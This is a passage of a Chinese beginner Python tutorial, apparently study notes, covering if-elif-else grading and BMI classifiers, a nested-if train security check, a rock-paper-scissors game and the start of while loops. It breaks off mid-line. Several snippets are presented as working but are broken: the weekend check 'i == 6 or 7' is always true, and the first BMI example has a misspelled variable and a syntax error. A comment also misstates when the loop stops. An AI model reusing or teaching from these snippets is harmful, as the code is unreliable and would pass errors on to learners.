data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"抱歉未满18请退出\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>练习</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>i <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"今天周几?:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">if</span> i <span class=\"token operator\">==</span> <span class=\"token number\">6</span> <span class=\"token keyword\">or</span> <span class=\"token number\">7</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"周末\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"工作日\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><strong>if-elif-else</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span>能完成当xxx时做事情</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token operator\">-</span><span class=\"token keyword\">else</span>能完成当xxx时做事情<span class=\"token number\">1</span>，否则做事情<span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>如果有这样一种情况：当xxx1满足时做事情<span class=\"token number\">1</span>；当xxx1不满足、xxx2满足时做事</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>情<span class=\"token number\">2</span>；当xxx2不满足、xxx3满足时做事情<span class=\"token number\">3</span>，那该怎么实现呢？</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token operator\">-</span><span class=\"token keyword\">elif</span><span class=\"token operator\">-</span><span class=\"token keyword\">else</span> 语句</pre></td></tr><tr><td data-num=\"8\"></td><td><pre> <span class=\"token keyword\">if</span> xxx1<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        事情<span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">elif</span> xxx2<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        事情<span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">elif</span> xxx3<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        事情<span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">elif</span>必须和<span class=\"token keyword\">if</span>一起使用，否则出错</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">else</span> 一般用在最后，即所有条件都不满足时使用</pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>demo1</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>i <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入考试成绩:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">if</span> i <span class=\"token operator\">>=</span><span class=\"token number\">90</span> <span class=\"token keyword\">and</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">100</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">elif</span> i <span class=\"token operator\">>=</span> <span class=\"token number\">80</span> <span class=\"token keyword\">and</span> i <span class=\"token operator\">&lt;</span><span class=\"token number\">90</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"B\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">elif</span> i <span class=\"token operator\">>=</span> <span class=\"token number\">70</span> <span class=\"token keyword\">and</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">80</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"C\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">elif</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">70</span> <span class=\"token keyword\">and</span> i <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"D\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入0-100\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>练一练</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>小明身高<span class=\"token number\">1.75</span>，体重<span class=\"token number\">80</span><span class=\"token punctuation\">.</span>5kg。请根据BMI公式（体重除以身高的平方）帮小明计算他的BMI指数，</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>并根据BMI指数：</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>低于<span class=\"token number\">18.5</span>：过轻 </pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token number\">18.5</span><span class=\"token operator\">-</span><span class=\"token number\">25</span>：正常 </pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token number\">25</span><span class=\"token operator\">-</span><span class=\"token number\">28</span>：过重 </pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token number\">28</span><span class=\"token operator\">-</span><span class=\"token number\">32</span>：肥胖 </pre></td></tr><tr><td data-num=\"41\"></td><td><pre>高于<span class=\"token number\">32</span>：严重肥胖 </pre></td></tr><tr><td data-num=\"42\"></td><td><pre>用<span class=\"token keyword\">if</span><span class=\"token operator\">-</span><span class=\"token keyword\">elif</span>判断并打印结果：</pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>bmi<span class=\"token operator\">=</span><span class=\"token number\">80.5</span><span class=\"token operator\">/</span><span class=\"token punctuation\">(</span><span class=\"token number\">1.75</span><span class=\"token operator\">*</span><span class=\"token number\">1.75</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">if</span> bmi<span class=\"token operator\">&lt;</span><span class=\"token number\">18.5</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"过轻\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">elif</span> bmi <span class=\"token operator\">>=</span> <span class=\"token number\">18.5</span> <span class=\"token keyword\">and</span> bim <span class=\"token operator\">&lt;</span><span class=\"token number\">25</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"正常\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">elif</span> bmi <span class=\"token operator\">>=</span><span class=\"token number\">25</span> <span class=\"token keyword\">and</span> bmi <span class=\"token operator\">&lt;</span> <span class=\"token number\">28</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"过重\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">elif</span> bmi <span class=\"token operator\">>=</span><span class=\"token number\">28</span> <span class=\"token keyword\">and</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">32</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"肥胖\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"严重肥胖\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>i <span class=\"token operator\">=</span> <span class=\"token builtin\">float</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'请输入身高(m):'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>z  <span class=\"token operator\">=</span> <span class=\"token builtin\">float</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'请输入体重(kg)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>bmi<span class=\"token operator\">=</span>z<span class=\"token operator\">/</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">*</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token keyword\">if</span> bmi<span class=\"token operator\">&lt;</span><span class=\"token number\">18.5</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"过轻\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token keyword\">elif</span> bmi <span class=\"token operator\">>=</span> <span class=\"token number\">18.5</span> <span class=\"token keyword\">and</span> bmi <span class=\"token operator\">&lt;</span><span class=\"token number\">25</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"正常\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token keyword\">elif</span> bmi <span class=\"token operator\">>=</span><span class=\"token number\">25</span> <span class=\"token keyword\">and</span> bmi <span class=\"token operator\">&lt;</span> <span class=\"token number\">28</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"过重\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token keyword\">elif</span> bmi <span class=\"token operator\">>=</span><span class=\"token number\">28</span> <span class=\"token keyword\">and</span> bmi <span class=\"token operator\">&lt;</span> <span class=\"token number\">32</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"肥胖\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"严重肥胖\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><strong>if 嵌套</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>坐火车或者地铁的实际情况是：先进行安检如果安检通过才会判</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>断是否有车票，或者是先检查是否有车票之后才会进行安检，即</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>实际的情况某个判断是再另外一个判断成立的基础上进行的，这样的情况该怎样解决呢？</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> 条件<span class=\"token number\">1</span>成立<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        做的事情<span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        做的事情<span class=\"token number\">2.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">if</span> 条件<span class=\"token number\">2</span>成立<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            做的事情<span class=\"token number\">1.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            做的事情<span class=\"token number\">2.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>说明 注意缩进</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    外层的<span class=\"token keyword\">if</span>判断，也可以是<span class=\"token keyword\">if</span><span class=\"token operator\">-</span><span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    内层的<span class=\"token keyword\">if</span>判断，也可以是<span class=\"token keyword\">if</span><span class=\"token operator\">-</span><span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    根据实际开发的情况，进行选择</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>piao <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请出示车票1(有)0(无):\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">if</span> piao <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#结果符合进入到</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请过来安检\"</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#这里</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    dao <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"刀子长度(cm)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#然后输入长度</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">if</span> dao <span class=\"token operator\">></span> <span class=\"token number\">9</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#进入到这里大于 9</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"不可进入\"</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#到这里</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"原地等待警察\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#小于 9 到这里</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"可以通行\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#不符合直接到这里</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"没有车票不可进入\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>结果<span class=\"token punctuation\">:</span><span class=\"token number\">1</span>  <span class=\"token number\">9</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>请出示车票<span class=\"token number\">1</span><span class=\"token punctuation\">(</span>有<span class=\"token punctuation\">)</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>无<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>请过来安检</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>刀子长度<span class=\"token punctuation\">(</span>cm<span class=\"token punctuation\">)</span><span class=\"token number\">9</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>可以通行</pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token number\">1</span>   <span class=\"token number\">18</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>请出示车票<span class=\"token number\">1</span><span class=\"token punctuation\">(</span>有<span class=\"token punctuation\">)</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>无<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>请过来安检</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>刀子长度<span class=\"token punctuation\">(</span>cm<span class=\"token punctuation\">)</span><span class=\"token number\">18</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>不可进入</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>原地等待警察</pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>请出示车票<span class=\"token number\">1</span><span class=\"token punctuation\">(</span>有<span class=\"token punctuation\">)</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>无<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>没有车票不可进入</pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token number\">3</span><span class=\"token operator\">></span>练一练</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>情节描述：上公交车去公园，并且可以有座位坐下</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>要求：输入公交卡当前的余额，只要超过<span class=\"token number\">2</span>元，就可</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>以上公交车<span class=\"token punctuation\">,</span>否则走着去；如果车上有空座位，就可以坐下，否则就站着吧。</pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>i <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"车票余额:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">import</span> random<span class=\"token comment\">#random 生成随机数模块</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">if</span> i <span class=\"token operator\">>=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"交钱上车\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    z<span class=\"token operator\">=</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#随机生成 0,1 赋值给 z 变量</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token keyword\">if</span> z <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"有车位可以坐下\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"抱歉没车位了\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"站着吧\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"没钱了跑着去吧\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><strong>猜拳游戏</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>ren <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入(石头[0] 剪刀[1] 布[2]):\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>jiqiren <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                                                                                                        </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span> ren <span class=\"token operator\">==</span><span class=\"token number\">1</span> <span class=\"token keyword\">and</span> jiqiren <span class=\"token operator\">==</span> <span class=\"token number\">2</span> <span class=\"token keyword\">or</span> ren <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token keyword\">and</span> jiqiren <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token keyword\">or</span> ren <span class=\"token operator\">==</span> <span class=\"token number\">2</span> <span class=\"token keyword\">and</span> jiqiren<span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'恭喜获胜'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">elif</span> ren <span class=\"token operator\">==</span> jiqiren<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"平局\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"可惜输了\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><strong>while 语句</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>循环语句</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">while</span>和<span class=\"token keyword\">if</span>的用法基本类似，区别在于：<span class=\"token keyword\">if</span> 条件成立，则执行一次； <span class=\"token keyword\">while</span> 条件成立，则重复执</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>行，直到条件不成立为止。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>一般情况下，需要多次重复执行的代码，都可以用循环的方式来完成</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>循环不是必须要使用的，但是为了提高代码的重复使用率，所以有经验的开发者都会采用循环</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>例如打印一百遍我爱你</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"我爱你\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"我爱你\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"我爱你\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"我爱你\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>这样太麻烦</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>利用<span class=\"token keyword\">while</span>循环</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">while</span> i<span class=\"token operator\">&lt;</span><span class=\"token number\">100</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"我爱你\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>每次执行 i都加<span class=\"token number\">1</span>然后打印我爱你直到i大于<span class=\"token number\">100</span>的时候停止打印</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>这样就不用重复手打了</pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>计算<span class=\"token number\">1</span><span class=\"token operator\">~</span><span class=\"token number\">100</span>的累积和（包含<span class=\"token number\">1</span>和<span class=\"token number\">100</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>i<span class=\"token 